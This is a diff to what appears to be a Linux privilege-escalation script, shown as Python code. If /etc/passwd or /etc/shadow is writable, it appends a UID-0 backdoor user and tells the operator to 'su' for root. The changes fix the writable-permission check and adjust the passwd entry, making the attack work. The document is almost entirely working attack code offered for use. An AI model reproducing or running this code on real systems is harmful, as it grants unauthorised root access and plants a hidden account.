@@ -464,10 +464,10 @@ def pass_shadow(username,password):
       if writable:
          os.system("echo ''")
          print("\n###!!! /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
-         os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
-         print("\n###!!! root-group user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
+         os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
+         print("\n###!!! root user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
          os.system("echo ''")
-         os.system("echo '### root-group user {}:{} created... run *su {}* for root privileges ###' > /tmp/passwd_res.txt".format(username,password,username))
+         os.system("echo '###!!! root user {}:{} created... run *su {}* for root privileges ###' > /tmp/passwd_res.txt".format(username,password,username))
          os.system("echo ''")
       else:
          os.system("echo ''")
@@ -477,14 +477,14 @@ def pass_shadow(username,password):
    os.system("ls -l /etc/shadow > /tmp/shad.txt")
    with open("/tmp/shad.txt") as shadow:
       perms = shadow.readline()
-      writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
+      writable = re.search("\\A.......rw|\\A.......-w", perms)
       if writable:
          os.system("echo ''")
          print("\n###!!! /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
          os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
-         print("\n###!!! root-group user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
+         print("\n###!!! root user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
          os.system("echo ''")
-         os.system("echo '### root-group user {}:{} created... run *su {}* for root privileges ###' > /tmp/shad_res.txt".format(username,password,username))
+         os.system("echo '###!!! root user {}:{} created... run *su {}* for root privileges ###' > /tmp/shad_res.txt".format(username,password,username))
          os.system("echo ''")
       else:
          os.system("echo ''")
